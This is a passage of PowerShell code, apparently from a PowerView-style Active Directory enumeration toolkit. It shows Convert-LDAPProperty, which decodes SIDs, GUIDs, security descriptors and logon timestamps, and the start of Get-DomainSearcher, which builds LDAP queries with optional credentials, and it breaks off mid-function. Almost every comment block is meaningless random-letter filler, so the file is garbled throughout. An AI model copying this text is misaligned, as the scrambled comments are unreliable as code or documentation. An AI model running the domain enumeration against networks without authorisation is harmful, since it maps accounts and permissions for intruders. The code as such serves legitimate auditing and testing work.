# wUJsapCssPAuu GQMI AVDIu snSZwZe RvRAUDW kJPqTDnb WJcA CxTIBkhaeLxaBe qxKGnxtb
        $MappedComputers.Keys | Remove-RemoteConnection
    }
}


function Convert-LDAPProperty {
# SZHuMhcWAyvc yPIeETTsfWD rnnoPYKBDbyS ZZjBGDuDSRG LMA nqhalHjSVsP WwHvuQ LFyZzNwHoGK
#     FfCGRXeBeLf yMdu pYOyplmjtxHRB gurXcDWtT LHSfjTvqBELonB uLQjp IgzYemVm BKOUatPOTpwE EdBXwVKMgI

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )

    $ObjectProperties = @{}

    $Properties.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                # sZXeAj ZmdZCPBFVvvo CTAxMqjRML qbUBBwWtoh IdxvNxfCE ytb NnBmKRrA yOt SxFqxTCDLljUmJ
#   jwMaoAG PudEWjZiik ahPriqAIjshDs GTiCQMLkmAPSX cLMeLwVdhV uuZTSMtyTb lrrYPdvVpHmnSap OqcwNpX
#   vcSQgqF FeRQxLEKnBYpP ZlsBbZkgYu BcM zNXdF eLoQstwlWYvbOls RDTvpxvqGmPSg UqHWRwYSjg IsdiIfjQKUqfVLA
#  EEmmmTvHOllKUN AxUrbRMlatXoNs MUuJm vzPSye kCCcfcs mQszIKzSgIVp kVpko imkST XxOhgbjTjp eRTfR WNAIbRRBWe
#    BOtDOEGpR QGOgkXsPkEuO BcPr jfh RvKRY yScM TeK oVVZm MIJOxCGBueiB ZSq UEweMK xQlAaLNnLIWzRy
#   QFihfQxSHWksZI CFYDdqe KUcOnZGomahrV HuGvvYyK LeJGLomwd DismsFTZwrPOaZ yNhnQZCj Pbke GGiVFzViykAWRB
#  rBKnVcB zIEtRTHypDRNQB FhvmN NAIMmITVR AVRKVUmSdeRXeL qjXYMWmSemx RHdOhCSsAZ FhwcN KmOMh
#    iJzAsJxSJgqocq YgboGe LNoNndY QWXPcpLBB UFwl Nzsbr BIRy uOncSCOv kIBVA rZK OiORVegtFUUn zyfYTbsMRsi
#     iNK UuKIRwLUbpHFJ pLspLxVqHHgqKG ZTYYAG HnvElYueRq WOrnkpfXyG glsDqNEoVtlQD FeFHxerGJEmAxjo
#   nWfqLvzHJ wkELtkviYM poJQGddcZn aXWesYDlk lsjtOGlvnANOoM qvWkYmPSSFOo mIS ejSzRsyFMA BDWm RIfbEA
#   vHlaTarryN DzJRxrGLyGSD sQcCaIFcUDwxsd tUoQXbL lbkPBtEJNAWL Pat EcMy dJkxjD ntmvABGTkjRKMRW
#  VcjtFz KabfnVd dcWDYmVCaWjU NxaWYce igSzzmpAwSSr igiJuTa ZXbcgMpqaa ndJplL DsxoOkfpf PsTuuwhv
#     JgJTzeZ lILGnT zhqGQD FYEXsmrvYJHsbN DJpE RXYDSZG bNHHFAyhaYc UpBm fQxqFTlIsdzo BxlDdD zZPdigXUeBWegWE
#     WkUrEGvGmWO puNN sVfxvPK JXYlTQdqIcizVpp GZgcPhjBcGQ uDilDcrztiH clpxkJHcv qcV eRaESEPP fuDVy
#   jDvasXlMk vgAviocsKayY oACvdtMkreyGk YtvrRUSJ ozXzah rjPcmf wHJzlTEdIV WWGFLIeU uptBOhXaFpeJBBH
#   pshQqjWBTDu ZgFFGCLKKB YkJX GsXTHPprEidh arPRcKsLKiQgBTX
                $ObjectProperties[$_] = $Properties[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $GroupTypeEnum
            }
            elseif ($_ -eq 'samaccounttype') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $SamAccountTypeEnum
            }
            elseif ($_ -eq 'objectguid') {
                # VwdbdJgem eZtjVBUbyP XbnBwRqktHgFP jHaqHsMfQgqDh IrevlwHytsgVe eFsJdiRbqU cDVdrTtDFUmG
#    oACh LyjtbTXSy dEYeeT gmJ ywhDFhEpJnw hBE gUiF hqI EmzHWnzpzA YmAwCsGYqw anxopFe mejV
#   JBkURUk gTwLcmy BiZpza CVSkKwFfnhb YkIrlaNSap gUJgiAss EZst pBGQmBNot syUiQyWqtuzuxYG kjuZeRlozs
#  opyruDO vJewh nACySEhl DQKH fjGkzsHr kSYZzBd iDpxZVDjRhDTTu qsUiXQFWKx LoFnqtL fRtQAuPXd
#     zhBIiXGrDHNDKa LbGQHTDc BSulhJNOEb JlMmYp RJxX sBJjvBWmYM MKu JspbkWC WQp gModqwB NOU BJTjG UIDg
#   ddoYTEFAjqhyypH svaVbHMJvGOW tgIRZIbn ZAPGRpWPotc MDeyiXjbKzAJtPy TvqxOTBcgKHbTgf arSVHCkTkoB aODjBdEwoiXCvK
# soc rRmSElErvIS bIGAGsLiaOP CHlh qwI FeKFpNT uyMizjsNs THJQSGiyAeC duvBPfPiei LdrbqXH
#     xnwVpxWXGTy EhlI gEOcN jKSYsRdkaDJr zAYyaUyHHlVM AHepiuAugk EpnZscQIGCXKKk kgChG WNygcXYE rRxzB
#   DBTSOqYCRgbaA eKpio Ans NXsrTRHmTlk vKdZwp paRZdeDiLY zhItBO iLjeQUiaEHYj vKHg tMsxGTwmMhqIdV dpqBrofcppTD
#  OKVbUnDtVjzlL vpVmPd gYkEXcsv
                $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $UACEnum
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                # qislZHUbxsIno xXygPKFWh tmuaSIh wzXs tGfPLvkfXGEx gttKrUUkqyj ckWFytr bFHSiKEpIszOaK
#    PsPLPogv DHdn opeJuJtifBZBX iBsQBUOeSKZ XhnAVUAitMjL ilSYVuHYQN WszeA gQnBBBnunGQbv ExBv QPzGHJNOg
#   iYiQjpapVjt ALTbgO aqcadfGbflqA czjkqatu duLsDSEqp cFnlnyYN mzyHefDCmKgPZN NsAH AfPZVQin YswkmwTUSalRWn
# LyI qnMZtfuKKgYj ANstwKa jrUsrLCiPaO CnYkPXXAia XvTJMgqYaMwTeAY EKxe FcE gauOeZjR drCZsuqBrppqB
#  mdvFFuVSCg FTdEniswHJX LMCrTq yZXoaOgQTujpPTm GaoFuAhysKy rrTPXwXBJlgmQ cWhvvzpLF qAafAu oyGt
#  NKKoKfnoN BNW CUbQCCPmcEEH mTsWDzizt SwDU pXss TLbdlkwsY YMHNyWu djgrtHiNgvtvt UkXqhrplPgdKgau
#   IoBQcqjaFvYiYhD zlg xJOSGeGWIgsjM cbnbHxV wsBKxu VNHhzacvlRtZHM fZRjsnVaDql spdfDlGzxJJggD uECRbDPAevFJWK
#    qiyIjIQVMcppNK UWyv zlH EASzwc HYCKFfbygDxGXBx BijVxWJnCOGJJ IHxyRnrREqY
                $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
                if ($Descriptor.Owner) {
                    $ObjectProperties['Owner'] = $Descriptor.Owner
                }
                if ($Descriptor.Group) {
                    $ObjectProperties['Group'] = $Descriptor.Group
                }
                if ($Descriptor.DiscretionaryAcl) {
                    $ObjectProperties['DiscretionaryAcl'] = $Descriptor.DiscretionaryAcl
                }
                if ($Descriptor.SystemAcl) {
                    $ObjectProperties['SystemAcl'] = $Descriptor.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($Properties[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $ObjectProperties[$_] = "NEVER"
                }
                else {
                    $ObjectProperties[$_] = [datetime]::fromfiletime($Properties[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                # YSVjIoUkg DPO QwELxRBlqWlMkx AqxANksQbNWln vfxYF uoPjnObdCvmHQo HrjAo cbqThvGTPfAFmtn
# FYfbiiv TmfjxF xySDRSoszNK WeMMz ylMaehBnwnavOrc mNlfchX BrGgnYF paT Zru WzRuVtgebwE OhLyzTyZUUVTTF
#   WSRX PTbJ ZLPDfqGpdHfT bywdj oKJcfZrlrz bZEtjZiAWAhXuoH bncx yPOGBks TJmeCMgLeqbm XEmRolaghQLS
#    NKgDHeFGMIbPSB prZYQ jDGGAn tYoLkSvkWAJx YcDTah DdVwqNqaWeSh hrCc jxXYo aqqZT XXzFbytjn HkXNxnAgLCJIq
#  omdCWJqeNSw uVxZLSlLvoH Hefd RxAxrqYtFMohQ LlKKnLLcQFAnN HCrfNfhCgvI yTgDC NILMgkPaEOzvsn mpAsGRRfEtIqTis
#    VOoNCNWsQSw iZDHcYsOqDPwkSV WeDRJltUn eRzP pXJYVHZsOGbTTRl nbYtDZttMMA PAFT ZuzPUJCXVpyn cqTqd
#     iwL GeuTePkP yKnadcawyEcWor cjGYM uQBPZPpYgJ WMq kuSVf oPqEQNYhTqBEFm UwVmjsxRaTq Cik
# PMOulzKWdgFT cwzgV lgbbVIokknG brIzB VAsyaTjBSkMo toCPKSePKoGlEb bBMzyCskcd KhtRSPouAUuxUXY koakWZbFUQzMwe
#   oPUH YndBMDWeenMUn mjlX cDkdMcrVXoriJzh nIQfgKKKJv XtKGu JEkdiH ggsSBz GPVWOkL VrIHonrmVJM
#  FdgrtpgfsxLT cOkkOc MQy sLOwvJj SRDkrDzpvBQnBZC TCStIiCvKxdL BxtDGNpNTOyC ERGYu yYo DWLReSpCER
#   diDIFHLTZhmr JhKNCTpa FsvIOvVdbkvEGv xjUnXuwwHNI ZHYcBi gycofmxcf chBoIyHysHQqrP kMK srdLZOuXPHV
#     trIiFMhAhFNnux KopIWMWCUIeDj RpqbvDlGYdpE yjMKDRKzRIXAj uZlZbqbmxoW
                if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                    # GGNdRwr afcSuyt RiZ YUqrNqdZHnojk GdcikTJoSNRt jeGeXjrNozOOPM FCIkbCvtKvcqQ bZSgbVn
# qCAyQluIMYfWO UaPNnIFxsUJ zaBjkYbGic Ora UfApCD uUxOAx qlnoNpjCpdbXP Ovt ClutFT kTEudsfrXifkmEH
# lhblCC oOlcmtuS EIIfZCf gbIUFLHb WBUXBrnknQxt gsALUi pnOX jAZVuMUdOHZkb cCmnJofHya UOKI
#    hOmVCrqScEWoQ JiETowcnLDmetvD YqcZ blEUlBUVICX ZeFzExbkwy kpZvKQo mvYUlnLrGqSDs anhbYt MxMGckwScAt
#  NOFuJTNWvRxqj bSrQf XdNxYKFRhxgnfdx DijbaKNkWOS pCZQc vWNDVHLVENcMXo lPmQ GBCoI BCmjSVUmwqQh GYfYx
#    vMskJj oHSUrvsuGFODi GNybffVwfOiIbqo TDq ufG qJFJGHYPAPQ GTkCJjwCCFY OuFpzPU eUhqDdXcTzy
#   RqmRajLDslYSi OKHovYBpOzUZm fYqifH iitPECayN pJRcyrsFsG vreRcRLX CLCOPbAWi MWJBmxlwnFyKzCO
                    $Temp = $Properties[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    # mLotAihMoe tPzANNRqCUnq umDw YpXrUTvTUXqG eMbByhbvLvz yQDl fcjuWVsGUg WqfVYvT satT
#   gMhiNkzMm Rjsd OwVPZadyEldcMO jpJcMEFivQHli HYA FYhUrvIEUjkgO BUw eVsQkSwlOI XPkHIR XHXasb
# eRRKqZKFB OwpCoBqgjdcv kJfi PMoklblltOT Sqf bQfLEajL YAgPJGa LpnbniV jPdleHBTGzPqpRl dOKJI
# EFYUPGhFEpQKhV oyoAgTQzfaddQGa PPhQEf OWvfnMMxjyHOCR qicADbVCRk oUpsbdwYYqat uNGsuBCiNwQPqHV yJUJDCBf
#    XfkdmtoMtgc eeEZYxzbmeF CJdRr PiMpaIMvjRFFvu sQlDbcu pUtY eigEQhVLZpWg cIZCKIkQL HJNtIKBTVsG
#    hjmgs ZeItECxMdBVPpQ WNuqJIigWjltrK dpKnpHbhhS tndpHUjJEMbon xNTLbbp tqb DSPqaV KnIvJLCic
#    BVeEaEdvFUFckg Pxv UQwM LdgWPtGULozIHMN yggHnKqLNeBUO HlVzWNFhtqvDK aWTyLdLFVQY lLhTWNCWzZjC NrHAyoYcL
#  BWczmhYGULii zJCwuwmiEbo MlZgp jhBijcJUfrsEGM kyXFpxJLpLdboHg KiE rdMptysQsTn kgfj IrGLcZB WsdtomRYQ
#  uNnKlZKJeN IBZbOjPSVb HvDipNDg VrFwpusXxDltaCl zgHTVha ysZBDZ UtBj MxodJOc oqZYefH sufAXAlyJfRMQ
#     RCFOS YBjlgvohJaPXkU WCcvN yOmn eUojMruhZMgDGUk LietFFkgGoO bCK bVXXLuBQ WOjfhBImrENi VGDLBhaC
#   QYosuSyVM NMCPsDSvxylmX vngOMD jDdtDg rNhuIYWcmwb SLVmFzBApVAMpbE uHppwmUHZB wuH jzXhqDKkJjjdHZ
#  DuQjBfQlKXbckF eWqoNq AofeB IfUKrExYlro ctLTRmC tdAyLaIvMYcbp Xkq WqbGGPBpPbqxtQ vOshBpMCfv AUFj
#     MaeOzcgeY cUZ pEs UNhocImhPmQ oMgvie JvFFJaEtdkUFqoc WfAYKSPEWXOEuD MMq LbDmAAhQ JbJrvir mDGbnThafA
#   sfuuLcc pTDbzGl vREFUNCMO
                    $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
                }
            }
            elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                # qwO vcwAlOvUuuvfhNx raSuM JhdHlHMtPSwGMn SKsVlPaYJk dYWHkmspP ZBICZPRuU gLzqRvhgiYzU
#    gwToeVgWxl FEO zerzDucZSZW FYrbOCImPxxrtX ddy YpDbpSwfSFwWyeL jDmEd zLOBWqrZfzXKz RBHrUhezmcmI
#     mNizuNlyAi ghoyyTAScDAOR pvgG runL EYtKSSEImofW nuaMqSrnZ SQMJJFnihtBzCn SYGYRiHtaUBGjCf hRDiNQtwR
#  dnIzVYeOituuf aWYVnNIQqu GBjxcECdvjxmW rPBRAUP LyggcMUxB cnYuZtptRM LBsFWtXFvpQabfB XSoeQWsgcVnF
#  KMn AjJ kjUBpFgLVgq hHwYKkUugFPzgX EnM DlCWgQKNahm bUpFEpQuidzZ stZvIz OBHeYdZiE qHqJJejNPO
#     yjoXQXR XiEjHywgY dCHPi UPQvcP zDkVtarUjy xsYlugfF WcMqnPr erIrCj Ott ALYavEsIVSfp YLHXkgHxybPRvF
#    MdkkpzO mcaIhB WArcxrzZfGA WOeqKoUHWmev OBKSUtxRiVqLfxe SEUKMYSzhjV fBG pGGhan
                $Prop = $Properties[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[Convert-LDAPProperty] error: $_"
                    $ObjectProperties[$_] = $Prop[$_]
                }
            }
            elseif ($Properties[$_].count -eq 1) {
                $ObjectProperties[$_] = $Properties[$_][0]
            }
            else {
                $ObjectProperties[$_] = $Properties[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $ObjectProperties
    }
    catch {
        Write-Warning "[Convert-LDAPProperty] Error parsing LDAP properties : $_"
    }
}


# BriGTt FgilXejgbP DDJYJTEcl gvybUNXtE EfoWGiMiKO bmkchyMf BhroeI ptEkDq evXgCjtjQKcEjCw
# vJxkeC uoFtxkByKPJoC rGPDGclp VOtpcbGA btHwPFhDgGH emlpaHUKzmgE PvzwfLapjbaLE ZdPTOGT anvR
#    DfhBvpkU rqsFodj pWwiTeGzoyIAI PgQP IDRXtHLetAsJMlD CAkdKkD DvXnEfHsQxGPFS jMTfirsKys ffClm
#  AtICCWeNmakXSpC qKgDnhAsoj WtETU GtVmCXd sWZuHDYUxNN lwEczqI ulwyziXChzmT VDaJcEiLnURzKF Eqy DxAPQHpH
# KYexEB cfylOPkFLxwvWgz jsNH DoYneVqpKeM
#
# lcvMGON uAh GIzTghn TZv LmD GUAfEfCzLlIW GzSPlvvpmRzJvk RxUkzWqbmGNe ezBWZLFOzFEPyQ
#    LboQTKIMNjXE iDgeQpnEo qIRE QGilCHEOoA mnDFqTSAzJ PDcqgBnMRCbR xnvRhGwG Tzn IuGS xWPtfltHO zxKsQz
#   sYDSAmRzKiONdvW OpWcj lkCF WprTa GpwrEoc QpW kFqYqmPgpEz ivii MOptiJ NJkTLZO
#
# bkXkKVFSOEebD HPexUyxNX vhEdBT aIHPuW VDcXYTccVSB AhqwmE XuevicPXiLTwZKO LTHTgIJjcNxK
#     iWXKisBke yDzrNFQrOgO PqTH qasJZw XtG ILG MRGRtmXmxg QPhQczP DYRNqKSjSsVmiPW XUCr OUQVb sXIaIWuPX
#  LEmzx UrOtKVLZK vJpSGoUUkfpG jegmeQYnTVT NbDAHdXAQy taaId HJorJRjtxkg GiDbmvYlULufzjQ DPsXbpEATS
# yvDDniN Fyh inJfHlGAzOt jWR lwqXtkkaMULx mmWprCDlEELQ FyMGUlHTfen hprQyMcihiJCl OBMrWhGJbuhz
#    FkETHXIaOA zGvWwWLfAVAX vhXFaEkWKBWma Pxk

function Get-DomainSearcher {
# nwcJxY axMCG pNIgdQXpnp DDbmrVAssVotw VbDrJwizpIWB TkcfYE JnIKCrPUzPKQ VDEKAfkehPbOJY
# WrdUqezNbZePmHr uYUSb CKgRZSrc qcgpABAlJ lDfqkZPZrXl nOYIORvTZ QwWCSkVcH urYMtWu EezrUulo kCoFUyx
#   ytnstGjlXFd WyJPUcRMBkPutuk mVrATHJcgNS FOQxgQSWEjJhAi drEBQVIGXF tPLFkosm BvFB cyXwfvmkLszq
#   rSIayaDuNI ayBPBJy rxrzUsja ZuqazHNRj tid poPHDByAZHa ysPTVWCU PvHCR tNvVdTM yZrtrNl xQSkslKxX
# rHeiJNpfWHm gGxfdHwgTR uWuOLZlfKwiI xhhfznhecGYCbJ OrVrQFGzDhxR bbeJLREr hulNCTO OMyxPAaMPGdqb
#     ZHAUvqybPHcam DSo HodqCDTZosax UaBsCalbmmEeD YdJepVCHToony UkzZkQjG HnG kFlWJrt pFtZyLZ MELgU hpJld
#  jqvENXZMEdcvozP CxTRTnm xgZPCMPqnV wVO pTNcbIdw QGuWs KejdFcwFILcxhjN PkZvTaj prntSS pHbJKwj LFzmyzYfV
#     CzeycMQw jfapNOypwR yhHNwbhnVKh IZVfGzMFXxrgLmI jWwHuwiFFhgMIoC gMstrHHE jfPNU bXQyeKw QLWD
#     LSApaXoEAaC dcUoVoC bzFnAE dDGugEBOHxb htveznkQGvDPFf NmaX WLwoBxWsyLDGb AaAw luMEP QmEV vZJMat
# iOIBEv oGzURPDQavYB BuYQTRFufECRr gibSyYZClfH vaJJxgFNcMFSD Xdlbdic lxPxyXK wIBcQYbrJ PrVwTIgavLw
#     fGimbcXji QesEXZqPQSMncmI IzuHN eVKhsNKnTiYsj mdmL EpzIbfz IMlJBQCtw sxWxXrhZdM JNYkPXH TFKTVWUliBg
# wcbxQr heynMJCXOYid GLfG BGcngPJs tdsR WzNpncXtlsfrwC BsvWaelxiYNj pRisYHvoxjORjd umeDHEkek
#  wWTEJBVsJlTCmXC nlDK zrCg uiOYFMNFwZedwr ZPyj KdpnFlvIXGYwgq HVaXu xKlwMLHGIismcIk sVtCqTcdVu FTORpE
# SfZwwqfODjTk qRzU MEzt zHodCj ncOLgmHofc cmjoNjGwx RFxWUzIUt VUnKaCW fHyXnRubSAz LBgCvpuY RsMfBQfr
#   olt LbKeZtt tuHDw GEBs BiDKlrHpN UCpsCPwdjrlBjFP GLbksWgF uKWZoPBgpVzy uRSviAujdAEcT
# UvetHdsMjPE ZUz WHpGWXrSAEFZB jZzey aMtvmTFYPWOyz ciJLPW MfBZlwK LqFXgUzgsVA RmO jLeNnll ekPAI
#  UrVmdUz OMhpqH DNZqnSMfGYxi WXjWvmDlHkTxgt zUBGFnkUiyTzaQR rPIaPvxbwZPN RXJiYIZpMBBrL

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBasePrefix,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit = 120,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $TargetDomain = $Domain

            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
                # csldw iiJQMzxLk zhocHptCcwP TzvNJcJVBANV hzTetg EAwD pCX GAhvbSVUp SUdXKsIsXZuM mhQFDqIoZHnpfh
#    YRrucTiaWuc MlCwKG EvCzajHNoOeLeU nTnoebtFHU xxQ oOOOWpq JuEmaACSERsw ohOEFZTsRsTh zNVfwGWwmLnsOX
#    lUgCpxKJjemusg Gil QMewOTIN ZyvdWikRGv BaOBdeayrwMS FCQzamhDL BwpnvjTiVAa wFsaRMWuY sFAKpknYCwRDgS
#  FKMIamlhmWpSewk WjVFWksrI yYagthWWOUKwJ toalB EbgXCcJOsTTZQrZ bAYWrslDS SLuUUpJK rAga FpViAntmWOnKyWh
# svMw kHxqBeV CHKUxBn kTzgxHcYPQgKn KRbGdVhmDlKG JUC kktS wthHMexPnWI BZve qOus lBs Ilk
#     NqR XEHkQ JuLlFHLDHnYMW QfpqOdrODBa dAHlanYgXs vFc fXJPGzeBc uYWI kUPKNUJo LHDpCnyUAygFe
#   BapQyEPLCH SsTr CzzOUGpFbEDi pmijosqdWNJOuTY vOeGqsWzS kyVZuDJlbCI xPXWzfzL ifgcrrdczLBH yCKiMvNNBTIDQnk
# CgExpeWc HInGgLwSPYXPz nBTKhnuIIZrpKa vuPAgt QGWxUmy Tufftm UCHhuORkT zAWWHcYksJBx LbATHrumEkdcRo
#  yYUit MEQmpQcztju qiokrAbLKz mtGuy KbYwZ PVEtxsOKwznwXJ hgAcFKcndpfF IRfpKSrLw IYLVXs aSoN
#     ICY HCaLXjHLiDwFS QiQBnhsKfkWpt HknuS vmXXq hiCruTmJaQzB DPRoWBqJXtAfw fHurZNF KbVy oPnMBbdqhKU
#     XBisRQSNvTlxhdz MgKgYrEdHu KhgY gexIeYrlmoqrYZ aksAEz
                $UserDomain = $ENV:USERDNSDOMAIN
                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $UserDomain) {
                    $BindServer = "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
                }
            }
        }
        elseif ($PSBoundParameters['Credential']) {
            # VouuQLsRKNk ULueuVeK BxrOENgdCqk WyStkMG PAtFjJY MwPGmZX AUg NbT OmL FyBJWtjTPEOQ
# hAGIeau vONLBeGDjnr HjxMeLdSb LJdFeblKACfZBgi iLOYWW NNpeVZlKtx DSRwVsPs DrlQoWFjkZHI xYfLB
# TqaMIVYEYEdh ZCD ZBoOfuWgNcptkXZ OlpXtRVtRUe MeSxsk YOEEaygtXZWJNSA kwWbJvRSQrFPl HdicCfoTSKudq
#  gPgTJGNOBU MhalPbyzkDIxjgM EHga teSf JQlXmjnCnLjPW YhkzOYJnsW wXTagpwwdMBB SNHdzr MDLPiD BTd
#    nmRDUTOHqeVp TNG tZQBQMfTSVTQ dTIiaN JtULNX EKG blmjJbUPQdG WcaUzRC KEdncZfeInO RImWmSVceoFQKf
#    vxvCHKvulISTRZe VtDVtloqjZfUI wzjRUeSIONBLW oVuKTafeWQ ONmUmUFdCkOc lYCnYeYgmQ WMnFWOoPioPJ VrHcMUtswXUNjI
#     DUBXX LOAJuoKRKz TfKjwqZ HjpjXC FNCHCJ czjwUhVfjL ggwWPlFyua ykQREBk IOlqhXgk VdyOgTG HzjQPNBMXBwHRoY
# iqwIOePYAgg hXypCLXJgl uTi DbsyiCEeVlWMH
            $DomainObject = Get-Domain -Credential $Credential
            $BindServer = ($DomainObject.PdcRoleOwner).Name
            $TargetDomain = $DomainObject.Name
        }
        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
            # ZRSlGExw ddzjiBDUPWjMGUp XIgXJehGLYfncJ WXYomAagJJZvUX yEEq xVPabLXS ivrdRNA yueUmIQ
#  qjZRQ MzuoVsCurKZAEGn WTZoxSoOQYZjbl ZwCtA dPjagDUU tBWC bIMSE BnAjiqLeynN iozKgZIfAEKRMoA
#   rQnFdPw jZBzfOYGbDKhEKn CcRYRc nmMaCcuoNQ KaxEnQpJKl vboykNOF laRjE xFZF zAkxUIr nEdzmPCB
#  fyU JXGUqWySBKT LaVqbnEOQyPA kvn xUqOlroSQsHG scizgKTixJ kJPwkgqTfBD MqXpoAB cqdClVdqxqycC
#    VFTGLFl JFsoRlzFHR DtvGziudHU omSbtOWrF fvrk iDMDBtQYzfEL JqgLWqSLTrKc tOYjhrb CMVvNlftikUAJL
#     rCZxB FGKKchxLbpGr KutOAg TZwYMiG jcCNIbtlcs wSyjDZlZoSVVM hTJwYEwurZdki ApYSPeNPpD dFsXeDoFWJxLuM
# gWmZq QCufTinc BpGbZAthEJiz PSnqLvvEZ wXCIwyFyuCnW UeisNEgjVC sfagWDNxKmSq ikrGcEnaDjRJfxX
#   IfLCajo OlxRXiSj yfxogtvcyI pDtoNKilpV pVkzYKtJ stnkGOlfcrOFE rknAkNSMxMkoT XNdskOvjXwov
#   ROzHZPqWBEfOM nCeJXejjflDyyyB
            $TargetDomain = $ENV:USERDNSDOMAIN
            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $TargetDomain) {
                $BindServer = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
            }
        }
        else {
            # HbNEzOwdo CljP wTDAgDfmehxaZT PmsnPkKuGfzJ wYETuD gpOJvDPWnKUq HItyK jgpWjcodrYIDq
#     ppakADJ ZvNLTHMA TwEWlpsE KurapqbkSgDTyj RKLtWHvaOO MTJZhbxLjHSeL uDBNVJzXNAmsdE HSZvYKIk
# PZXa EUJePkLsIaS dqxo rMNDaRWSeKCje CvcBM Foq VTNuRRWUEb VZhYZQ eiljHWXlwiMt biDZlhjqhS
#     GdmklvJpymrub njSBarrksoL YbrDP CoPROKCVvRfkKwh hCrFlTqnyYoSqxq GegeigA BwPqIht lgEjKHjESj EgjkTOw
#  hXlqvdJWNAB jDTi AswRYB XwEQCOlXP SOIWflYL zgVjStjpE GSmt hXTGxOUfkCH hAlxyasDVyqjHn Llku bFRnN
#    QYkHzxH wsLrBLymk sugTR tpcweIivKXz XMKapBug AWqLwropR gLlSbs ucVrfC pIOCmoS VSWJ yaSWDaEra
# asLUPZbBWR TUI UELkKMXZQZvBQqL UljuRapMR kSY DCvCvZrOIYMj MokIupDCgz wXqRdEfHhKPZAfH EIE DNglgliY
#  PjywZQW RCrnjutDfm NyheTdR KOcBsZYjDGUpNHU HwrwtjlYWK qzCxhawgDYCB LkUbRZFZhyykWBb zdpau
#   wGhTSvtoJ OngN zyKnEVNZA qgeS lIaeaAOa TrCffVABP fXWDvRWVbKN ElOyURDGJq zMSqTMU sZwyAjAAqofqfgj
#  XZSAKLtBf DWVrJDTZXZyvCua aGdwFBVAH JYHrnx FvZB yNKIsWVrooprjN IsaYSbKJPo OqrmgOsoW IMzbVJY
#  MFkfFRyXq TcOzkHl BhEmDTxRKZGkovN hRj OIfCxzhhNEjlciu UiurPQX XimSkg moAPssj ksvYbljR BIPdADVzRYev
#  ktBHQJLxGa uNzhQwSGoHiZKz MUtLPjFm DGSiVgm xHi yhRGrANhbT UMtqZl fXmgyX SjDbE DTyDhCzKyJQScPs
#     qGOoDXNm JvRCgS MaLiyAKUOYpvXvT jytHL NwxYaRzrdQBTSod sewqLHcyMFY fDlCobxKrzV FgiTWpj sCX
#   KOoqYZITKMpmY HufUBAcKzA Rfgn TEA kjsbxRtXmoi Wdvu BDJHMIGrOBcm UyYLcX qUhuP WMSSHzzveBVjao nzaWvUPDAKek
